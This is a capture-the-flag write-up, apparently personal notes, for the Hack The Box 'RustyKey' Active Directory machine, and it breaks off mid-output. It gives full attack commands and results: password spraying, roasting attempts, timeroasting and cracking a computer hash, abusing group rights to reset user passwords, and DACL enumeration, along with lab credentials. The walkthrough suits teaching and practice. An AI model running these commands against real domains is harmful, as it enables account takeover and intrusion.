---
created: 2026-09-23
modified: 2026-09-23
---


![[RustyKey.png]]

Machine Info:

```
As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker / 8#t5HE8L!W3A
```

## Enumeration

### Port scan

```bash
sudo nmap -Pn -sCV -p- --min-rate 2000 -T3 -oN rustykey-port-scan 10.10.11.75
[sudo] password for darklight: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-18 20:03 EAT
Warning: 10.10.11.75 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.75
Host is up (0.56s latency).
Not shown: 65456 closed tcp ports (reset), 53 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-19 01:06:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49736/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-19T01:07:24
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 8h00m09s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 283.76 seconds
```

From the ouput of  nmap we have identified the domain as `rustykey.htb` and the domain controller `Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows`,  which is `dc` making the FDQN to be `dc.rustykey.htb`

We also have a clock-skew of `8h00m09s` , for more info about clock-skew read this: [[Resolving clock_skew error]]

### SMB Recon

```bash
smbclient -L \\10.10.11.75\\ -U 'rr.parker'        
session setup failed: NT_STATUS_NOT_SUPPORTED
```

`NT_STATUS_NOT_SUPPORTED` basically tells us that `NTLM authentication` is not supported and we should switch to `kerberos authentication` instead.

Testing the credentials provided `rr.parker / 8#t5HE8L!W3A`.

```bash
faketime "$(ntpdate -q 10.10.11.75 | cut -d ' ' -f 1,2)" \
> nxc smb dc.rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -k 
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
```

I didn't see any interesting share:

```bash
faketime "$(ntpdate -q 10.10.11.75 | cut -d ' ' -f 1,2)" \
nxc smb dc.rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -k --shares
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
SMB         dc.rustykey.htb 445    dc               [*] Enumerated shares
SMB         dc.rustykey.htb 445    dc               Share           Permissions     Remark
SMB         dc.rustykey.htb 445    dc               -----           -----------     ------
SMB         dc.rustykey.htb 445    dc               ADMIN$                          Remote Admin
SMB         dc.rustykey.htb 445    dc               C$                              Default share
SMB         dc.rustykey.htb 445    dc               IPC$            READ            Remote IPC
SMB         dc.rustykey.htb 445    dc               NETLOGON        READ            Logon server share 
SMB         dc.rustykey.htb 445    dc               SYSVOL          READ            Logon server share 
```

#### RID brute forcing 

```bash
faketime "$(ntpdate -q 10.10.11.75 | cut -d ' ' -f 1,2)" \
nxc smb dc.rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -k --rid-brute 10000
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
SMB         dc.rustykey.htb 445    dc               498: RUSTYKEY\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         dc.rustykey.htb 445    dc               500: RUSTYKEY\Administrator (SidTypeUser)
SMB         dc.rustykey.htb 445    dc               501: RUSTYKEY\Guest (SidTypeUser)

[SNIP]         
SMB         dc.rustykey.htb 445    dc               3601: RUSTYKEY\backupadmin (SidTypeUser)
```

Save the output to a file and extract the users with the command below:

```bash
cat userGroup.dump | grep -i 'sidtypeuser' | awk '{print $6}' | cut -d '\' -f 2 > users.txt
```

Before we continue doing any other stuff, let's generate the `krb5` file.

```bash
faketime -f '+8h' \
> nxc smb dc.rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -k --generate-krb5-file rustykey.krb5
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
```

Copy it to `/etc/krb5.conf`.

```bash
sudo cp rustykey.krb5 /etc/krb5.conf
```

#### Kerberoasting 
[[Roasting#Kerberoasting]]

```bash
faketime -f '+8h' \               
impacket-GetUserSPNs rustykey.htb/rr.parker:'8#t5HE8L!W3A' -dc-host dc.rustykey.htb -request -k
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

No service accounts.

#### AS_REP roasting
[[Roasting#AS-REP Roasting]]

Also no good luck on this one.

```bash
faketime -f '+8h' \
impacket-GetNPUsers rustykey.htb/rr.parker:'8#t5HE8L!W3A' -dc-ip 10.10.11.75 -usersfile users.txt -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Support-Computer1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Support-Computer2$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Support-Computer3$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Support-Computer4$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Support-Computer5$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Finance-Computer1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Finance-Computer2$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Finance-Computer3$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Finance-Computer4$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Finance-Computer5$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User IT-Computer1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User IT-Computer2$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User IT-Computer3$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User IT-Computer4$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User IT-Computer5$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User rr.parker doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mm.turner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User dd.ali doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
[-] User nn.marcos doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backupadmin doesn't have UF_DONT_REQUIRE_PREAUTH set
```

#### Password Spraying

```bash
faketime -f '+8h' \
nxc smb dc.rustykey.htb -u userAccounts.txt  -p '8#t5HE8L!W3A' -k
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\Administrator:8#t5HE8L!W3A KDC_ERR_PREAUTH_FAILED 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\Guest:8#t5HE8L!W3A KDC_ERR_CLIENT_REVOKED 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\krbtgt:8#t5HE8L!W3A KDC_ERR_CLIENT_REVOKED 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\rr.parker:8#t5HE8L!W3A [Errno 104] Connection reset by peer
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\mm.turner:8#t5HE8L!W3A KDC_ERR_PREAUTH_FAILED 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\bb.morgan:8#t5HE8L!W3A KDC_ERR_ETYPE_NOSUPP 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\gg.anderson:8#t5HE8L!W3A KDC_ERR_CLIENT_REVOKED 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\dd.ali:8#t5HE8L!W3A KDC_ERR_PREAUTH_FAILED 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\ee.reed:8#t5HE8L!W3A KDC_ERR_ETYPE_NOSUPP 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\nn.marcos:8#t5HE8L!W3A KDC_ERR_PREAUTH_FAILED 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\backupadmin:8#t5HE8L!W3A KDC_ERR_PREAUTH_FAILED 
```

the error `KDC_ERR_ETYPE_NOSUPP` means `The Key Distribution Center (KDC) doesn’t support the encryption type (etype) requested by the client.` 
Most tools use `RC4` encryption to request for tickets as it is easier to crack compared to `AES` 

To resolve this issue you can simply add this flag followed by the `128 bits key OR 256 bits key` but unfortunately we dont have the keys.
```bash
--aesKey < 128 bit key>
	OR
--aesKey < 256 bits key>
```

Ways we can get the keys:
- From NTDS.dit / DCSync / secretsdump
- mimikatz sekurlsa::ekeys

### Active Directory Recon
Dump all AD data for analysis with bloodhound.

```bash
faketime -f '+8h' \
bloodhound-ce-python -u rr.parker@rustykey.htb -p '8#t5HE8L!W3A' -d rustykey.htb -ns 10.10.11.75 -c All --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: rustykey.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 16 computers
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 12 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 10 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: dc.rustykey.htb
INFO: Done in 03M 11S
INFO: Compressing output into 20250819055118_bloodhound.zip
```

[[Rusteykey - AD Mappings.canvas|Rusteykey - AD Mappings]]

bloodyAD --host dc.rustykey.htb --dc-ip 10.10.11.75 -d rustykey.htb -k get writable


Based on the AD analysis shown above we need to have access to `IT-computer3` so that we can move on to either of the users we can change their password from `helpdesk`group`

#### Time roasting. 

This is a new concept to me, never came across this before but here we are

[[Roasting#Time Roasting]]

```bash
 python3 timeroast.py dc.rustykey.htb -o ../computer_hashes.txt
                                                                                                                             
┌──(darklight㉿jinx)-[~/…/htb/machines/rustykey/Timeroast]
└─$ cat ../computer_hashes.txt| wc -l
16
```

we have 16 computer hashes.

Cracking the hashes

```bash
python3 timecrack.py ../../computer_hashes.txt rockyou_utf8.txt
[+] Cracked RID 1125 password: Rusty88!

1 passwords recovered.
```

We have the RID of a computer account and its password.

```bash
cat userGroup.dump| grep '1125'                                                            
SMB         dc.rustykey.htb 445    dc               1125: RUSTYKEY\IT-Computer3$ (SidTypeUser)

```

> IT-Computer3$ : Rusty88!


## Exploitation

From the AD analysis we had done earlier we already know that `it-computer3` has `addSelf` rights over the `helpdesk group`. So the next set is adding the computer to the group.
#### Adding IT-Computer3$  to HelpDesk group

```bash
faketime -f '+8h' \
bloodyAD -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' --host dc.rustykey.htb -k add groupMember 'HelpDesk' 'IT-Computer3$'
[+] IT-Computer3$ added to HelpDesk

```

#### Changing user's password.

We know that from `help desk group` we get the right to change the passwords for 4 users but 3 of them are in `remote management group`.

```bash
 faketime -f '+8h' \
bloodyAD -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' --host dc.rustykey.htb -k set password bb.morgan Password@123
[+] Password changed successfully!
                                                                                                                                                  
┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/rustykey]
└─$ faketime -f '+8h' \
bloodyAD -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' --host dc.rustykey.htb -k set password ee.reed Password@123
[+] Password changed successfully!
                                                                                                                                                  
┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/rustykey]
└─$ faketime -f '+8h' \
bloodyAD -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' --host dc.rustykey.htb -k set password gg.anderson Password@123
[+] Password changed successfully!

```

I gave them all the same password just to make my work a little easier.

#### Testing the new credentials

```bash
faketime -f '+8h' \                                             
nxc smb dc.rustykey.htb -u newPassusers.txt -p 'Password@123' -k 
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\bb.morgan:Password@123 KDC_ERR_ETYPE_NOSUPP 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\ee.reed:Password@123 KDC_ERR_ETYPE_NOSUPP 
SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\gg.anderson:Password@123 KDC_ERR_CLIENT_REVOKED 
```

We are already familiar with the error `KDC_ERR_ETYPE_NOSUPP`. Maybe its time we look for a walk around for this.
This error `KDC_ERR_CLIENT_REVOKED` , AD rejected the authentication because the account cannot log in anymore maybe because the account is **disabled, expired, or locked out**.

##### Checking gg.anderson Account status

```bash
faketime -f '+8h' \
bloodyAD -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' --host dc.rustykey.htb -k get object gg.anderson               

distinguishedName: CN=gg.anderson,OU=Users,OU=IT,DC=rustykey,DC=htb
accountExpires: 1601-01-01 00:00:00+00:00
badPasswordTime: 1601-01-01 00:00:00+00:00
badPwdCount: 0
cn: gg.anderson
codePage: 0
countryCode: 0
dSCorePropagationData: 2024-12-27 11:26:21+00:00
displayName: gg.anderson
givenName: gg.anderson
instanceType: 4
lastLogoff: 1601-01-01 00:00:00+00:00
lastLogon: 1601-01-01 00:00:00+00:00
logonCount: 0
logonHours: ////////////////////////////
memberOf: CN=IT,CN=Users,DC=rustykey,DC=htb
msDS-SupportedEncryptionTypes: 0
nTSecurityDescriptor: O:S-1-5-21-3316070415-896458127-4139322052-512G:S-1-5-21-3316070415-896458127-4139322052-512D:AI(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3316070415-896458127-4139322052-553)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;;S-1-5-21-3316070415-896458127-4139322052-553)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;;S-1-5-21-3316070415-896458127-4139322052-553)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;;S-1-5-21-3316070415-896458127-4139322052-553)(OA;;0x30;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3316070415-896458127-4139322052-517)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;0x30;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;0x30;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-1-0)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;CR;ab721a54-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;CR;ab721a56-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;;S-1-5-11)(OA;;RP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-11)(OA;;RP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-11)(OA;;RP;e45795b3-9455-11d1-aebd-0000f80367c1;;S-1-5-11)(OA;;0x30;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-10)(OA;;0x30;e45795b2-9455-11d1-aebd-0000f80367c1;;S-1-5-10)(OA;;0x30;e45795b3-9455-11d1-aebd-0000f80367c1;;S-1-5-10)(A;;0xf01ff;;;S-1-5-21-3316070415-896458127-4139322052-512)(A;;0xf01ff;;;S-1-5-32-548)(A;;RC;;;S-1-5-11)(A;;0x20094;;;S-1-5-10)(A;;0xf01ff;;;S-1-5-18)(OA;CIID;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3316070415-896458127-4139322052-1128)(OA;CIID;RP;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3316070415-896458127-4139322052-1128)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3316070415-896458127-4139322052-526)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3316070415-896458127-4139322052-527)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-3-0)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-9)(OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-10)(OA;CIIOID;0x20094;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIIOID;0x20094;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x20094;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;OICIID;0x30;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;S-1-5-10)(OA;CIID;0x130;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;S-1-5-10)(A;CIID;0xf01ff;;;S-1-5-21-3316070415-896458127-4139322052-519)(A;CIID;LC;;;S-1-5-32-554)(A;CIID;0xf01bd;;;S-1-5-32-544)
name: gg.anderson
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=rustykey,DC=htb
objectClass: top; person; organizationalPerson; user
objectGUID: e9af2482-f77c-4671-a746-953840678178
objectSid: S-1-5-21-3316070415-896458127-4139322052-1140
primaryGroupID: 513
pwdLastSet: 2025-08-22 15:01:40.286188+00:00
sAMAccountName: gg.anderson
sAMAccountType: 805306368
uSNChanged: 186191
uSNCreated: 20637
'userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD'
userPrincipalName: gg.anderson@rustykey.htb
whenChanged: 2025-08-22 15:01:40+00:00
whenCreated: 2024-12-27 11:12:24+00:00
              
```

From the output we notice that the account is disabled.

> `userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD`

Trying to enable the account fails because we have insufficient rights 

```bash
faketime -f '+8h' \
bloodyAD -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' --host dc.rustykey.htb -k remove uac gg.anderson -f ACCOUNTDISABLE
Traceback (most recent call last):
  File "/usr/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
             ~~~~^^
  File "/usr/lib/python3/dist-packages/bloodyAD/main.py", line 201, in main
    output = args.func(conn, **params)
  File "/usr/lib/python3/dist-packages/bloodyAD/cli_modules/remove.py", line 288, in uac
    conn.ldap.bloodymodify(
    ~~~~~~~~~~~~~~~~~~~~~~^
        target, {"userAccountControl": [(Change.REPLACE.value, uac)]}
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    )
    ^
  File "/usr/lib/python3/dist-packages/bloodyAD/network/ldap.py", line 285, in bloodymodify
    raise err
msldap.commons.exceptions.LDAPModifyException: LDAP Modify operation failed on DN CN=gg.anderson,OU=Users,OU=IT,DC=rustykey,DC=htb! Result code: "insufficientAccessRights" Reason: "b'00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0\n\x00'"
```

After 2000years of trying to find a way to enable `gg.anderson` account and  trying to bypass `KDC_ERR_ETYPE_NOSUPP` , I came across something that said `bloodhound does not show you everything` , after being hit with this reality i went to another adventure of enumerating objects' ACLs from CLI which took another 1000years ... i dont know... i will definately redo this phase coz i tried multiple tools and they did give me what i wanted eg `impacket-dacledit, ldapsearch` but definately `netexec` didn't  disappoint. It made me realize i have being relying on bloodhound only to enumerate the ACLs, i will definately have a note explain how i can enumerate ACLs from .

```bash
faketime -f '+8h' \
nxc ldap 10.10.11.75 -u rr.parker -p '8#t5HE8L!W3A' -k -M daclread -o TARGET='PROTECTED OBJECTS' ACTION=read
LDAP        10.10.11.75     389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        10.10.11.75     389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
DACLREAD    10.10.11.75     389    DC               Be careful, this module cannot read the DACLS recursively.
DACLREAD    10.10.11.75     389    DC               Target principal found in LDAP (CN=Protected Objects,CN=Users,DC=rustykey,DC=htb)
DACLREAD    10.10.11.75     389    DC               ACE[0] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : WriteProperty
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Object type (GUID)        : Self-Membership (bf9679c0-0de6-11d0-a285-00aa003049e2)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : HelpDesk (S-1-5-21-3316070415-896458127-4139322052-1128)
DACLREAD    10.10.11.75     389    DC               ACE[1] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : None
DACLREAD    10.10.11.75     389    DC                   Access mask               : ReadProperty
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Object type (GUID)        : Token-Groups-Global-And-Universal (46a9b11d-60ae-405a-b7e8-ff8a58d456d2)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : BUILTIN\Windows Authorization Access Group (S-1-5-32-560)
DACLREAD    10.10.11.75     389    DC               ACE[2] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : None
DACLREAD    10.10.11.75     389    DC                   Access mask               : ControlAccess
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Object type (GUID)        : Send-To (ab721a55-1e2f-11d0-9819-00aa0040529b)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : Authenticated Users (S-1-5-11)
DACLREAD    10.10.11.75     389    DC               ACE[3] info                
DACLREAD    10.10.11.75     389    DC                   Access mask               : FullControl, Modify, ReadAndExecute, ReadAndWrite, Read, Write, WriteDACL, Delete, ListObject, WriteProperties, Self, CreateChild (0xf01ff)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : Domain Admins (S-1-5-21-3316070415-896458127-4139322052-512)
DACLREAD    10.10.11.75     389    DC               ACE[4] info                
DACLREAD    10.10.11.75     389    DC                   Access mask               : ReadProperties, ListChildObjects (0x14)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : HelpDesk (S-1-5-21-3316070415-896458127-4139322052-1128)
DACLREAD    10.10.11.75     389    DC               ACE[5] info                
DACLREAD    10.10.11.75     389    DC                   Access mask               : FullControl, Modify, ReadAndExecute, ReadAndWrite, Read, Write, WriteDACL, Delete, ListObject, WriteProperties, Self, CreateChild (0xf01ff)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : Account Operators (S-1-5-32-548)
DACLREAD    10.10.11.75     389    DC               ACE[6] info                
DACLREAD    10.10.11.75     389    DC                   Access mask               : Read (0x20094)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : Principal Self (S-1-5-10)
DACLREAD    10.10.11.75     389    DC               ACE[7] info                
DACLREAD    10.10.11.75     389    DC                   Access mask               : Read (0x20094)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : Authenticated Users (S-1-5-11)
DACLREAD    10.10.11.75     389    DC               ACE[8] info                
DACLREAD    10.10.11.75     389    DC                   Access mask               : FullControl, Modify, ReadAndExecute, ReadAndWrite, Read, Write, WriteDACL, Delete, ListObject, WriteProperties, Self, CreateChild (0xf01ff)
DACLREAD    10.10.11.75     389    DC                   Trustee (SID)             : Local System (S-1-5-18)
DACLREAD    10.10.11.75     389    DC               ACE[9] info                
DACLREAD    10.10.11.75     389    DC                   ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
DACLREAD    10.10.11.75     389    DC                   ACE flags                 : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
DACLREAD    10.10.11.75     389    DC                   Access mask               : ReadProperty
DACLREAD    10.10.11.75     389    DC                   Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
DACLREAD    10.10.11.75     389    DC                   Object type (GUID)        : User-Account-Restrictions (4c164200-20c0-11d0-a768-00aa006e0529)
